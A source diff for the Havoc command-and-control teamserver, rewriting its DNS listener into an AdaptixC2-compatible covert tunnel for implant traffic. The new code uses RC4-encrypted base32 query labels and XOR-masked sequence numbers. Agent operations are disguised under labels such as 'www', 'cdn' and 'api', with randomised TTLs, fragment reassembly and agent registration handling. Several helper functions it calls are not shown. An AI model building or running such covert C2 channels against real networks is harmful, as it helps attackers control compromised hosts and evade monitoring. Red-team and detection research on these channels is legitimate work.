@@ -1,14 +1,23 @@
 package handlers
 
 import (
+	crand "crypto/rand"
+	"crypto/rc4"
+	"encoding/base32"
 	"encoding/base64"
+	"encoding/binary"
+	"encoding/hex"
 	"fmt"
+	"math/rand"
 	"net"
+	"regexp"
+	"slices"
 	"strconv"
 	"strings"
 	"sync"
 	"time"
 
+	"Havoc/pkg/agent"
 	"Havoc/pkg/colors"
 	"Havoc/pkg/logger"
 
@@ -16,67 +25,181 @@ import (
 )
 
 const (
-	DNSDefaultBindHost  = "0.0.0.0"
-	DNSDefaultBindPort  = 53
-	DNSDefaultFrequency = 30
-	DNSMinFrequency     = 5
-	DNSMaxFrequency     = 300
+	DNSDefaultBindHost = "0.0.0.0"
+	DNSDefaultBindPort = 53
+	DNSDefaultPktSize  = 512
+	DNSDefaultTTL      = 10
+	DNSDefaultKey      = "000102030405060708090a0b0c0d0e0f"
 
-	// DNSChunkChars is the maximum number of base64url characters a single
-	// agent query carries. The value is split into DNS labels by the agent.
-	DNSChunkChars = 180
+	// DNSMaxUpload bounds a single reassembled upload. The agent splits
+	// larger messages into fragments and the server never allocates more
+	// than this for one session.
+	DNSMaxUpload = 4 << 20
 
-	// DNSMaxChunks bounds the reassembly buffer: 512 * 180 = 92160 encoded
-	// characters, roughly 69 KiB of raw transport data.
-	DNSMaxChunks = 512
+	// dnsSafeChunkSize is the largest raw payload that is safe to return in
+	// a single UDP DNS answer.
+	dnsSafeChunkSize = 220
 
-	// DNSTXTStringChars is the maximum length of a single TXT string. A TXT
-	// string is length-prefixed with one byte, so it must stay below 255.
-	DNSTXTStringChars = 200
+	// seqXorMask is applied to the sequence number before it is written as
+	// hex into the QNAME. The agent uses the same mask.
+	seqXorMask = 0x5A5A5A5A
 
-	DNSChunkTTL    = 60 * time.Second
-	DNSCleanupTick = 30 * time.Second
+	dnsCleanupInterval = 60 * time.Second
+	dnsStaleTimeout    = 5 * time.Minute
+	dnsDownTimeout     = 10 * time.Minute
+	dnsDedupTimeout    = 5 * time.Minute
 )
 
-type dnsChunkBuffer struct {
-	total    int
-	parts    []string
-	received int
-	updated  time.Time
+// DNSConfig is the DNS listener transport configuration. The wire-relevant
+// fields mirror AdaptixC2's TransportConfig; the remaining fields keep the
+// Havoc listener metadata the rest of the teamserver expects.
+type DNSConfig struct {
+	// AdaptixC2-compatible transport configuration.
+	HostBind     string `json:"host_bind"`
+	PortBind     int    `json:"port_bind"`
+	Domain       string `json:"domain"`
+	PktSize      int    `json:"pkt_size"`
+	TTL          int    `json:"ttl"`
+	EncryptKey   string `json:"encrypt_key"`
+	BurstEnabled bool   `json:"burst_enabled"`
+	BurstSleep   int    `json:"burst_sleep"`
+	BurstJitter  int    `json:"burst_jitter"`
+	Resolvers    string `json:"resolvers"`
+	DohResolvers string `json:"doh_resolvers"`
+
+	// Domains is the canonical domain suffix list used by parseRequest.
+	// It is derived from Domain and is never sent to the agent.
+	Domains []string `json:"-"`
+
+	// Havoc listener metadata and client-facing compatibility fields.
+	Name         string `json:"name"`
+	KillDate     int64  `json:"kill_date"`
+	WorkingHours string `json:"working_hours"`
+
+	// Legacy names kept so existing profiles and clients keep working.
+	BindHost   string `json:"bind_host,omitempty"`
+	BindPort   int    `json:"bind_port,omitempty"`
+	RecordType string `json:"record_type,omitempty"`
+	Encoding   string `json:"encoding,omitempty"`
+	Frequency  int    `json:"frequency,omitempty"`
 }
 
-type dnsCachedResponse struct {
-	data    string
-	expires time.Time
+// TransportDNS implements the AdaptixC2-compatible DNS transport.
+type TransportDNS struct {
+	Config DNSConfig
+
+	Teamserver agent.TeamServer
+	Active     bool
+
+	udpServer *dns.Server
+	tcpServer *dns.Server
+
+	mu          sync.Mutex
+	upFrags     map[string]*dnsFragBuf
+	downFrags   map[string]*dnsDownBuf
+	upDoneCache map[string]*dnsUpDone
+	needsReset  map[string]bool
+	rng         *rand.Rand
+	quit        chan struct{}
+	stopOnce    sync.Once
 }
 
-type dnsState struct {
-	mutex     sync.Mutex
-	chunks    map[string]*dnsChunkBuffer
-	responses map[string]*dnsCachedResponse
-	quit      chan struct{}
-	stopOnce  sync.Once
+type dnsFragBuf struct {
+	total           uint32
+	buf             []byte
+	filled          uint32
+	highWater       uint32
+	expectedOff     uint32
+	lastUpdate      time.Time
+	seenOffsets     map[uint32]bool
+	lastReceivedOff uint32
+	nextExpectedOff uint32
+	chunkSize       uint32
 }
 
-func newDNSState() *dnsState {
-	return &dnsState{
-		chunks:    make(map[string]*dnsChunkBuffer),
-		responses: make(map[string]*dnsCachedResponse),
-		quit:      make(chan struct{}),
-	}
+type dnsDownBuf struct {
+	total      uint32
+	off        uint32
+	buf        []byte
+	taskNonce  uint32
+	lastUpdate time.Time
+}
+
+type dnsUpDone struct {
+	total  uint32
+	doneAt time.Time
+}
+
+type dnsRequest struct {
+	sid   string
+	op    string
+	seq   int
+	data  []byte
+	qtype uint16
+	qname string
+}
+
+type putAckInfo struct {
+	lastReceivedOff uint32
+	nextExpectedOff uint32
+	total           uint32
+	filled          uint32
+	needsReset      bool
+	complete        bool
 }
 
 func NewConfigDns() *DNS {
-	return &DNS{State: newDNSState()}
+	return &DNS{TransportDNS: &TransportDNS{}}
 }
 
-func (d *DNS) logDebug(format string, args ...any) {
-	logger.Debug(fmt.Sprintf(format, args...))
+func newFragBuf(total uint32) *dnsFragBuf {
+	return &dnsFragBuf{
+		total:       total,
+		buf:         make([]byte, total),
+		lastUpdate:  time.Now(),
+		seenOffsets: make(map[uint32]bool),
+	}
+}
+
+func newDownBuf(data []byte, nonce uint32) *dnsDownBuf {
+	return &dnsDownBuf{
+		total:      uint32(len(data)),
+		buf:        data,
+		taskNonce:  nonce,
+		lastUpdate: time.Now(),
+	}
+}
+
+func (d *DNS) Start() error {
+	if d.TransportDNS == nil {
+		d.TransportDNS = &TransportDNS{}
+	}
+	d.TransportDNS.Teamserver = d.Teamserver
+
+	if err := d.TransportDNS.Start(); err != nil {
+		return err
+	}
+
+	addr := net.JoinHostPort(d.Config.HostBind, strconv.Itoa(d.Config.PortBind))
+	logger.Info("Started \"" + colors.Green(d.Config.Name) + "\" listener: " + colors.BlueUnderline("dns://"+addr+"#"+d.Config.Domain))
+
+	// Add listener to teamserver.
+	pk := d.Teamserver.ListenerAdd("", LISTENER_DNS, d)
+	d.Teamserver.EventAppend(pk)
+	d.Teamserver.EventBroadcast("", pk)
+
+	return nil
+}
+
+func (d *DNS) Stop() error {
+	if d.TransportDNS == nil {
+		return nil
+	}
+	return d.TransportDNS.Stop()
 }
 
 // normalizeDNSDomain returns the canonical lower-case domain without a
-// trailing dot. DNS question names always arrive as FQDNs, so comparing
-// against a non-canonical value silently never matches.
+// trailing dot.
 func normalizeDNSDomain(domain string) (string, error) {
 	domain = strings.TrimSpace(strings.ToLower(domain))
 	domain = strings.TrimSuffix(domain, ".")
@@ -84,8 +207,6 @@ func normalizeDNSDomain(domain string) (string, error) {
 		return "", fmt.Errorf("dns domain is empty")
 	}
 
-	// dns.IsDomainName only enforces length limits; reject characters that
-	// cannot appear in a host name and empty labels explicitly.
 	if len(domain) > 253 {
 		return "", fmt.Errorf("dns domain is too long: %s", domain)
 	}
@@ -103,83 +224,132 @@ func normalizeDNSDomain(domain string) (string, error) {
 	return domain, nil
 }
 
-// normalizeDNSRecordType only TXT is supported by the current protocol.
-func normalizeDNSRecordType(recordType string) (string, error) {
-	switch strings.ToUpper(strings.TrimSpace(recordType)) {
-	case "", "TXT":
-		return "TXT", nil
-	default:
-		return "", fmt.Errorf("unsupported dns record type %q (only TXT is supported)", recordType)
+// NormalizeDNSConfig applies the default values of a DNS listener
+// configuration and validates the result. The listener and the payload
+// builder share it so that the teamserver and the agent always use the same
+// effective configuration.
+func NormalizeDNSConfig(config DNSConfig) (DNSConfig, error) {
+	domain, err := normalizeDNSDomain(config.Domain)
+	if err != nil {
+		return config, err
 	}
+	config.Domain = domain
+	config.Domains = []string{domain}
+
+	// Keep the legacy Havoc field names in sync with the wire fields.
+	if config.HostBind == "" {
+		config.HostBind = config.BindHost
+	}
+	if config.HostBind == "" {
+		config.HostBind = DNSDefaultBindHost
+	}
+	config.BindHost = config.HostBind
+
+	if config.PortBind == 0 {
+		config.PortBind = config.BindPort
+	}
+	if config.PortBind == 0 {
+		config.PortBind = DNSDefaultBindPort
+	}
+	if config.PortBind < 1 || config.PortBind > 65535 {
+		return config, fmt.Errorf("invalid dns bind port: %d", config.PortBind)
+	}
+	config.BindPort = config.PortBind
+
+	if config.PktSize <= 0 {
+		config.PktSize = DNSDefaultPktSize
+	}
+	if config.TTL <= 0 {
+		config.TTL = DNSDefaultTTL
+	}
+	if config.EncryptKey == "" {
+		// A listener without an explicit key gets its own random key. The
+		// key is part of the listener configuration and is therefore
+		// persisted with the listener.
+		key, err := generateDNSKey()
+		if err != nil {
+			return config, err
+		}
+		config.EncryptKey = key
+	}
+	if _, err := rc4Key(config.EncryptKey); err != nil {
+		return config, err
+	}
+	if config.Frequency <= 0 {
+		config.Frequency = 30
+	}
+	if config.BurstSleep <= 0 {
+		config.BurstSleep = 50
+	}
+	if config.BurstJitter < 0 {
+		config.BurstJitter = 0
+	}
+	if config.BurstJitter > 90 {
+		config.BurstJitter = 90
+	}
+	if config.RecordType == "" {
+		config.RecordType = "TXT"
+	}
+	if config.Encoding == "" {
+		config.Encoding = "base32"
+	}
+
+	return config, nil
 }
 
-// normalizeDNSEncoding accepts the legacy "base64" spelling but always uses
-// the URL-safe alphabet on the wire, because standard base64 contains
-// characters that are not valid inside a DNS label.
-func normalizeDNSEncoding(encoding string) (string, error) {
-	switch strings.ToLower(strings.TrimSpace(encoding)) {
-	case "", "base64", "base64url":
-		return "base64url", nil
-	default:
-		return "", fmt.Errorf("unsupported dns encoding %q (only base64url is supported)", encoding)
+// generateDNSKey returns a random 16 byte key in its hex representation.
+func generateDNSKey() (string, error) {
+	key := make([]byte, 16)
+
+	if _, err := crand.Read(key); err != nil {
+		return "", fmt.Errorf("failed to generate the dns encryption key: %w", err)
 	}
+
+	return hex.EncodeToString(key), nil
 }
 
-func normalizeDNSFrequency(frequency int) int {
-	if frequency <= 0 {
-		return DNSDefaultFrequency
+func (t *TransportDNS) normalizeConfig() error {
+	config, err := NormalizeDNSConfig(t.Config)
+	if err != nil {
+		return err
 	}
-	if frequency < DNSMinFrequency {
-		return DNSMinFrequency
-	}
-	if frequency > DNSMaxFrequency {
-		return DNSMaxFrequency
-	}
-	return frequency
+
+	t.Config = config
+
+	return nil
 }
 
-// Start initializes and starts the DNS listener. The listener is bound
-// synchronously so a bind failure is reported to ListenerStart instead of
-// leaving a listener registered but not actually listening.
-func (d *DNS) Start() error {
+// Start binds UDP and TCP synchronously so a bind failure is reported to
+// ListenerStart instead of leaving a listener registered but not listening.
+func (t *TransportDNS) Start() error {
 	logger.Debug("Setup DNS Server")
 
-	if d.Config.Name == "" || d.Config.Domain == "" {
-		return fmt.Errorf("dns listener name/domain not set")
-	}
-
-	domain, err := normalizeDNSDomain(d.Config.Domain)
-	if err != nil {
-		return err
-	}
-	recordType, err := normalizeDNSRecordType(d.Config.RecordType)
-	if err != nil {
-		return err
-	}
-	encoding, err := normalizeDNSEncoding(d.Config.Encoding)
-	if err != nil {
+	if err := t.normalizeConfig(); err != nil {
 		return err
 	}
 
-	d.Config.Domain = domain
-	d.Config.RecordType = recordType
-	d.Config.Encoding = encoding
-	d.Config.Frequency = normalizeDNSFrequency(d.Config.Frequency)
+	logger.Debug("DNS listener \"" + t.Config.Name + "\" uses the RC4 key " + t.Config.EncryptKey)
 
-	if d.Config.BindHost == "" {
-		d.Config.BindHost = DNSDefaultBindHost
+	if t.quit == nil {
+		t.quit = make(chan struct{})
 	}
-	if d.Config.BindPort == 0 {
-		d.Config.BindPort = DNSDefaultBindPort
+	if t.upFrags == nil {
+		t.upFrags = make(map[string]*dnsFragBuf)
 	}
-	if d.Config.BindPort < 1 || d.Config.BindPort > 65535 {
-		return fmt.Errorf("invalid dns bind port: %d", d.Config.BindPort)
+	if t.downFrags == nil {
+		t.downFrags = make(map[string]*dnsDownBuf)
 	}
-	if d.State == nil {
-		d.State = newDNSState()
+	if t.upDoneCache == nil {
+		t.upDoneCache = make(map[string]*dnsUpDone)
+	}
+	if t.needsReset == nil {
+		t.needsReset = make(map[string]bool)
+	}
+	if t.rng == nil {
+		t.rng = rand.New(rand.NewSource(time.Now().UnixNano()))
 	}
 
-	addr := net.JoinHostPort(d.Config.BindHost, strconv.Itoa(d.Config.BindPort))
+	addr := net.JoinHostPort(t.Config.HostBind, strconv.Itoa(t.Config.PortBind))
 
 	udpConn, err := net.ListenPacket("udp", addr)
 	if err != nil {
@@ -192,52 +362,42 @@ func (d *DNS) Start() error {
 		return fmt.Errorf("failed to bind dns tcp %s: %w", addr, err)
 	}
 
-	d.Server = &dns.Server{
-		PacketConn: udpConn,
-		Handler:    dns.HandlerFunc(d.handleDNSRequest),
-	}
-	d.TCPServer = &dns.Server{
-		Listener: tcpListener,
-		Handler:  dns.HandlerFunc(d.handleDNSRequest),
-	}
-	d.Active = true
+	mux := dns.NewServeMux()
+	mux.HandleFunc(".", t.handleDNS)
 
-	go d.cleanupLoop()
+	t.udpServer = &dns.Server{PacketConn: udpConn, Handler: mux}
+	t.tcpServer = &dns.Server{Listener: tcpListener, Handler: mux}
+	t.Active = true
+
+	go t.cleanupLoop()
 
 	go func() {
-		if err := d.Server.ActivateAndServe(); err != nil {
-			d.Active = false
+		if err := t.udpServer.ActivateAndServe(); err != nil {
+			t.Active = false
 			logger.Error("DNS UDP server stopped: " + err.Error())
 		}
 	}()
 
 	go func() {
-		if err := d.TCPServer.ActivateAndServe(); err != nil {
-			d.Active = false
+		if err := t.tcpServer.ActivateAndServe(); err != nil {
+			t.Active = false
 			logger.Error("DNS TCP server stopped: " + err.Error())
 		}
 	}()
-
-	logger.Info("Started \"" + colors.Green(d.Config.Name) + "\" listener: " + colors.BlueUnderline("dns://"+addr+"#"+d.Config.Domain))
-
-	// Add listener to teamserver.
-	pk := d.Teamserver.ListenerAdd("", LISTENER_DNS, d)
-	d.Teamserver.EventAppend(pk)
-	d.Teamserver.EventBroadcast("", pk)
 
 	return nil
 }
 
 // Stop gracefully shuts down both DNS transports.
-func (d *DNS) Stop() error {
-	if d.State != nil {
-		d.State.stopOnce.Do(func() {
-			close(d.State.quit)
+func (t *TransportDNS) Stop() error {
+	if t.quit != nil {
+		t.stopOnce.Do(func() {
+			close(t.quit)
 		})
 	}
 
 	var firstErr error
-	for _, server := range []*dns.Server{d.Server, d.TCPServer} {
+	for _, server := range []*dns.Server{t.udpServer, t.tcpServer} {
 		if server == nil {
 			continue
 		}
@@ -248,82 +408,97 @@ func (d *DNS) Stop() error {
 		}
 	}
 
-	d.Active = false
+	t.Active = false
 	return firstErr
 }
 
-func (d *DNS) cleanupLoop() {
-	ticker := time.NewTicker(DNSCleanupTick)
+func (t *TransportDNS) cleanupLoop() {
+	ticker := time.NewTicker(dnsCleanupInterval)
 	defer ticker.Stop()
 
 	for {
 		select {
-		case <-d.State.quit:
+		case <-t.quit:
 			return
 		case now := <-ticker.C:
-			d.State.mutex.Lock()
-			for token, buffer := range d.State.chunks {
-				if now.Sub(buffer.updated) > DNSChunkTTL {
-					delete(d.State.chunks, token)
-				}
-			}
-			for token, response := range d.State.responses {
-				if now.After(response.expires) {
-					delete(d.State.responses, token)
-				}
-			}
-			d.State.mutex.Unlock()
+			t.cleanupStale(now)
 		}
 	}
 }
 
-// handleDNSRequest processes one TXT query. The query name carries one chunk
-// of a base64url-encoded Demon transport message:
-//
-//	<seq>.<total>.<token>.<data-label-1>...<data-label-n>.<domain>
-func (d *DNS) handleDNSRequest(w dns.ResponseWriter, r *dns.Msg) {
-	var ExternalIP string
-	if host, _, err := net.SplitHostPort(w.RemoteAddr().String()); err == nil {
-		ExternalIP = host
-	} else {
-		ExternalIP = w.RemoteAddr().String()
-	}
+func (t *TransportDNS) cleanupStale(now time.Time) {
+	t.mu.Lock()
+	defer t.mu.Unlock()
 
+	for sid, fb := range t.upFrags {
+		if now.Sub(fb.lastUpdate) > dnsStaleTimeout {
+			delete(t.upFrags, sid)
+		}
+	}
+	for sid, db := range t.downFrags {
+		if now.Sub(db.lastUpdate) > dnsDownTimeout {
+			delete(t.downFrags, sid)
+		}
+	}
+	for sid, done := range t.upDoneCache {
+		if now.Sub(done.doneAt) > dnsDedupTimeout {
+			delete(t.upDoneCache, sid)
+		}
+	}
+}
+
+// handleDNS processes one DNS question. HI/PUT/GET/HB map onto the same
+// label order used by AdaptixC2:
+//
+//	{SID}.{OP}.{SEQ}.{IDX}.{DATA_LABELS}.{DOMAIN}
+func (t *TransportDNS) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 	msg := new(dns.Msg)
 	msg.SetReply(r)
 	msg.Authoritative = true
 
-	for _, question := range r.Question {
-		if question.Qtype != dns.TypeTXT {
-			continue
-		}
+	ttl := uint32(t.Config.TTL)
+	if ttl == 0 {
+		ttl = DNSDefaultTTL
+	}
+	ttl += uint32(rand.Intn(60))
 
-		seq, total, token, data, ok := d.parseQueryName(question.Name)
-		if !ok {
-			d.logDebug("ignoring dns query %s", question.Name)
-			continue
-		}
+	// Only one question is expected per query, the first one is answered.
+	if len(r.Question) > 0 {
+		req := t.parseRequest(r.Question[0])
 
-		response, complete := d.assembleChunks(token, seq, total, data, ExternalIP)
-		if complete && response != "" {
+		switch req.op {
+		case "HI":
+			if len(req.data) > 0 {
+				t.handleHI(req, w)
+			}
+			msg.Answer = append(msg.Answer, t.buildAckResponse(req, ttl))
+
+		case "PUT":
+			var ack putAckInfo
+			if len(req.data) > 0 {
+				ack = t.handlePUT(req)
+			}
+			msg.Answer = append(msg.Answer, t.buildPutAckResponse(req, ack, ttl))
+
+		case "GET":
+			frame := t.handleGET(req, w)
+			msg.Answer = append(msg.Answer, t.buildDataResponse(req, frame, ttl))
+
+		case "HB":
+			needsReset, hasPending := t.handleHB(req)
+			msg.Answer = append(msg.Answer, t.buildHBResponse(req, needsReset, hasPending, ttl))
+
+		default:
 			msg.Answer = append(msg.Answer, &dns.TXT{
-				Hdr: dns.RR_Header{
-					Name:   question.Name,
-					Rrtype: dns.TypeTXT,
-					Class:  dns.ClassINET,
-					Ttl:    5,
-				},
-				Txt: splitTXTStrings(response),
+				Hdr: dns.RR_Header{Name: req.qname, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl},
+				Txt: []string{"OK"},
 			})
 		}
-
-		// Only one question is expected per query.
-		break
 	}
 
 	// A UDP answer larger than the client's buffer must set TC so the client
 	// retries over TCP. The TCP handler runs the same code path.
-	if w.LocalAddr().Network() == "udp" {
+	if w.LocalAddr() != nil && w.LocalAddr().Network() == "udp" {
 		size := dns.MinMsgSize
 		if opt := r.IsEdns0(); opt != nil && int(opt.UDPSize()) > size {
 			size = int(opt.UDPSize())
@@ -332,143 +507,676 @@ func (d *DNS) handleDNSRequest(w dns.ResponseWriter, r *dns.Msg) {
 	}
 
 	if err := w.WriteMsg(msg); err != nil {
-		d.logDebug("failed to write dns response: %v", err)
+		logger.Debug("failed to write dns response: " + err.Error())
 	}
 }
 
-func (d *DNS) parseQueryName(name string) (seq int, total int, token string, data string, ok bool) {
-	domain := strings.ToLower(dns.Fqdn(d.Config.Domain))
-	qname := dns.Fqdn(name)
-
-	// Compare the suffix case-insensitively, but keep the data labels byte
-	// for byte: base64url is case-sensitive.
-	if !strings.HasSuffix(strings.ToLower(qname), domain) || len(qname) == len(domain) {
-		return 0, 0, "", "", false
+func (t *TransportDNS) domains() []string {
+	if len(t.Config.Domains) > 0 {
+		return t.Config.Domains
 	}
-
-	prefix := qname[:len(qname)-len(domain)]
-	prefix = strings.TrimSuffix(prefix, ".")
-	if prefix == "" {
-		return 0, 0, "", "", false
+	if t.Config.Domain == "" {
+		return nil
 	}
-
-	parts := strings.Split(prefix, ".")
-	if len(parts) < 4 {
-		return 0, 0, "", "", false
+	domain := strings.TrimSuffix(strings.ToLower(t.Config.Domain), ".")
+	if domain == "" {
+		return nil
 	}
-
-	seq, err := strconv.Atoi(parts[0])
-	if err != nil {
-		return 0, 0, "", "", false
-	}
-	total, err = strconv.Atoi(parts[1])
-	if err != nil {
-		return 0, 0, "", "", false
-	}
-	token = strings.ToLower(parts[2])
-
-	if total < 1 || total > DNSMaxChunks || seq < 0 || seq >= total {
-		return 0, 0, "", "", false
-	}
-	if len(token) != 8 || !isHex(token) {
-		return 0, 0, "", "", false
-	}
-
-	data = strings.Join(parts[3:], "")
-	if data == "" || len(data) > DNSChunkChars {
-		return 0, 0, "", "", false
-	}
-
-	return seq, total, token, data, true
+	return []string{domain}
 }
 
-func isHex(value string) bool {
-	for _, c := range value {
-		if !((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f')) {
-			return false
+func (t *TransportDNS) parseRequest(q dns.Question) *dnsRequest {
+	labels := dns.SplitDomainName(q.Name)
+	base := labels
+
+	// Strip the configured domain suffix, if any.
+	if domains := t.domains(); len(domains) > 0 {
+		for i := range labels {
+			tail := strings.ToLower(strings.Join(labels[i:], "."))
+
+			if slices.Contains(domains, tail) {
+				base = labels[:i]
+				break
+			}
 		}
 	}
-	return true
+
+	req := new(dnsRequest)
+	req.qtype = q.Qtype
+	req.qname = q.Name
+
+	if len(base) < 5 {
+		return req
+	}
+
+	req.sid = strings.ToLower(base[0])
+	rawOp := strings.ToLower(base[1])
+
+	switch rawOp {
+	case "www", "hi":
+		req.op = "HI"
+	case "cdn", "put":
+		req.op = "PUT"
+	case "api", "get":
+		req.op = "GET"
+	case "hb":
+		req.op = "HB"
+	}
+
+	if v, err := strconv.ParseUint(base[2], 16, 32); err == nil {
+		req.seq = int(v ^ seqXorMask)
+	}
+
+	dataLabel := strings.ToUpper(strings.Join(base[4:], ""))
+	enc := base32.StdEncoding.WithPadding(base32.NoPadding)
+	if db, err := enc.DecodeString(dataLabel); err == nil {
+		req.data = db
+	}
+
+	if match, _ := regexp.MatchString("^[0-9a-fA-F]{8}$", req.sid); !match {
+		req.op = ""
+	}
+
+	maxPayload := t.Config.PktSize * 4
+	if maxPayload <= 0 {
+		maxPayload = DNSDefaultPktSize * 4
+	}
+	if len(req.data) > maxPayload {
+		req.data = nil
+	}
+
+	return req
 }
 
-// assembleChunks stores a chunk and, once all chunks are present, decodes the
-// message, processes it through the normal agent request parser, and caches
-// the response by token. A retried message carries the same token, so a lost
-// final response does not execute the same task twice.
-func (d *DNS) assembleChunks(token string, seq int, total int, data string, externalIP string) (string, bool) {
-	if d.State == nil {
-		return "", false
+func (t *TransportDNS) handleHI(req *dnsRequest, w dns.ResponseWriter) {
+	if len(req.data) < 8 {
+		return
 	}
 
-	now := time.Now()
-	d.State.mutex.Lock()
-	defer d.State.mutex.Unlock()
+	fullBeat := t.crypt(req.data)
+	if len(fullBeat) < 8 {
+		return
+	}
 
-	if cached, ok := d.State.responses[token]; ok {
-		if now.Before(cached.expires) {
-			return cached.data, true
+	// Havoc's registration packet starts with [size][magic][agent id].
+	if isHavocPackage(fullBeat) {
+		t.processHIBeat(req.sid, fullBeat, remoteIP(w))
+		return
+	}
+
+	// A framed HI message carries [total][offset][chunk] so a registration
+	// packet that does not fit into a single query can be split over
+	// several queries.
+	if total, offset, chunk, ok := parseDNSFrame(fullBeat); ok {
+		complete, _, _, assembled := t.addFragment(req.sid+":hi", total, offset, chunk)
+		if complete && assembled != nil {
+			t.processHIBeat(req.sid, assembled, remoteIP(w))
 		}
-		delete(d.State.responses, token)
+		return
 	}
 
-	buffer, ok := d.State.chunks[token]
-	if !ok || buffer.total != total {
-		buffer = &dnsChunkBuffer{
-			total: total,
-			parts: make([]string, total),
-		}
-		d.State.chunks[token] = buffer
-	}
-
-	if buffer.parts[seq] == "" {
-		buffer.received++
-	}
-	buffer.parts[seq] = data
-	buffer.updated = now
-
-	if buffer.received != buffer.total {
-		return "", false
-	}
-
-	encoded := strings.Join(buffer.parts, "")
-	delete(d.State.chunks, token)
-
-	message, err := base64.RawURLEncoding.DecodeString(encoded)
-	if err != nil {
-		logger.Error("Failed to decode DNS command: " + err.Error())
-		return "", false
-	}
-
-	response, success := parseAgentRequest(d.Teamserver, message, externalIP)
-	if !success {
-		logger.Warn("Failed to parse agent request over DNS")
-		return "", false
-	}
-
-	encodedResponse := base64.RawURLEncoding.EncodeToString(response.Bytes())
-	if encodedResponse != "" {
-		d.State.responses[token] = &dnsCachedResponse{
-			data:    encodedResponse,
-			expires: now.Add(time.Duration(d.Config.Frequency) * time.Second),
-		}
-	}
-
-	return encodedResponse, true
+	t.processHIBeat(req.sid, fullBeat, remoteIP(w))
 }
 
-func splitTXTStrings(value string) []string {
-	if value == "" {
+// processHIBeat registers the agent from a decrypted HI payload.
+//
+// Two layouts are supported:
+//   - Havoc's native packet, which starts with [size][magic][agent id].
+//   - AdaptixC2's beat, whose first 8 bytes carry the agent type and id and
+//     whose remainder carries the agent metadata.
+func (t *TransportDNS) processHIBeat(sid string, beat []byte, externalIP string) {
+	if len(beat) == 0 {
+		return
+	}
+
+	if isHavocPackage(beat) {
+		response := t.processAgentData(sid, beat, externalIP)
+		t.storeResponse(sid, response)
+		t.touchAgent(sid)
+		return
+	}
+
+	if len(beat) > 8 {
+		agentType := binary.BigEndian.Uint32(beat[0:4])
+		agentID := binary.BigEndian.Uint32(beat[4:8])
+		logger.Debug(fmt.Sprintf("DNS HI: agent type %08x id %08x", agentType, agentID))
+
+		if rest := beat[8:]; isHavocPackage(rest) {
+			response := t.processAgentData(sid, rest, externalIP)
+			t.storeResponse(sid, response)
+		}
+	}
+
+	t.touchAgent(sid)
+}
+
+// parseDNSFrame splits a fragment frame into its total length, the offset of
+// the carried chunk and the chunk itself.
+//
+// The layout is fixed by the protocol: [0:4] total (big endian),
+// [4:8] offset (big endian), [8:] chunk.
+func parseDNSFrame(data []byte) (uint32, uint32, []byte, bool) {
+	if len(data) < 9 {
+		return 0, 0, nil, false
+	}
+
+	total := binary.BigEndian.Uint32(data[0:4])
+	offset := binary.BigEndian.Uint32(data[4:8])
+	chunk := data[8:]
+
+	if total == 0 || total > DNSMaxUpload {
+		return 0, 0, nil, false
+	}
+	if offset > total {
+		return 0, 0, nil, false
+	}
+	if uint32(len(chunk)) > total {
+		return 0, 0, nil, false
+	}
+
+	return total, offset, chunk, true
+}
+
+// addFragment stores one fragment frame in the reassembly buffer identified
+// by key. It returns the reassembly state and, once the message is complete,
+// the assembled payload.
+func (t *TransportDNS) addFragment(key string, total uint32, offset uint32, chunk []byte) (bool, uint32, uint32, []byte) {
+	t.mu.Lock()
+	defer t.mu.Unlock()
+
+	if t.upFrags == nil {
+		t.upFrags = make(map[string]*dnsFragBuf)
+	}
+	if t.upDoneCache == nil {
+		t.upDoneCache = make(map[string]*dnsUpDone)
+	}
+
+	if done, exists := t.upDoneCache[key]; exists && done.total == total {
+		return true, done.total, done.total, nil
+	}
+
+	fb, ok := t.upFrags[key]
+	if !ok || fb.total != total || (offset == 0 && fb.highWater > 0) {
+		fb = newFragBuf(total)
+		t.upFrags[key] = fb
+	}
+
+	chunkLen := uint32(len(chunk))
+	if fb.chunkSize == 0 && chunkLen > 0 {
+		fb.chunkSize = chunkLen
+	}
+
+	if offset >= fb.total || fb.seenOffsets[offset] {
+		return false, t.computeNextExpectedOffset(fb), fb.filled, nil
+	}
+
+	end := min(offset+chunkLen, fb.total)
+	n := end - offset
+	copy(fb.buf[offset:end], chunk[:n])
+
+	fb.seenOffsets[offset] = true
+	fb.filled += n
+	fb.lastReceivedOff = offset
+	fb.expectedOff = end
+	fb.lastUpdate = time.Now()
+	if end > fb.highWater {
+		fb.highWater = end
+	}
+	fb.nextExpectedOff = t.computeNextExpectedOffset(fb)
+
+	if fb.filled >= fb.total {
+		assembled := make([]byte, len(fb.buf))
+		copy(assembled, fb.buf)
+		t.upDoneCache[key] = &dnsUpDone{total: fb.total, doneAt: time.Now()}
+		delete(t.upFrags, key)
+		return true, fb.total, fb.filled, assembled
+	}
+
+	return false, fb.nextExpectedOff, fb.filled, nil
+}
+
+func (t *TransportDNS) handlePUT(req *dnsRequest) putAckInfo {
+	ack := putAckInfo{}
+
+	if len(req.data) == 0 {
+		return ack
+	}
+
+	t.mu.Lock()
+	if t.needsReset[req.sid] {
+		ack.needsReset = true
+		delete(t.needsReset, req.sid)
+	}
+	t.mu.Unlock()
+
+	decrypted := t.crypt(req.data)
+	ack = t.handlePutFragment(req.sid, decrypted, ack)
+
+	t.touchAgent(req.sid)
+	return ack
+}
+
+func (t *TransportDNS) handlePutFragment(sid string, data []byte, ack putAckInfo) putAckInfo {
+	if sid == "" {
+		return ack
+	}
+
+	// A message that is not a fragment frame is processed as-is. This keeps
+	// the transport usable for small single-packet messages and for clients
+	// that only implement the original AdaptixC2 path.
+	if len(data) <= 8 {
+		response := t.processAgentData(sid, data, "")
+		t.storeResponse(sid, response)
+		return ack
+	}
+
+	total, offset, chunk, ok := parseDNSFrame(data)
+	if !ok {
+		response := t.processAgentData(sid, data, "")
+		t.storeResponse(sid, response)
+		return ack
+	}
+
+	ack.total = total
+
+	if offset == 0 && total <= uint32(len(chunk)) {
+		payload := chunk[:total]
+		ack.complete = true
+		ack.filled = total
+		ack.lastReceivedOff = 0
+		ack.nextExpectedOff = total
+		response := t.processAgentData(sid, payload, "")
+		t.storeResponse(sid, response)
+		return ack
+	}
+
+	complete, nextExpected, filled, assembled := t.addFragment(sid, total, offset, chunk)
+
+	ack.complete = complete
+	ack.nextExpectedOff = nextExpected
+	ack.filled = filled
+	ack.lastReceivedOff = offset
+
+	if assembled != nil {
+		response := t.processAgentData(sid, assembled, "")
+		t.storeResponse(sid, response)
+	}
+
+	return ack
+}
+
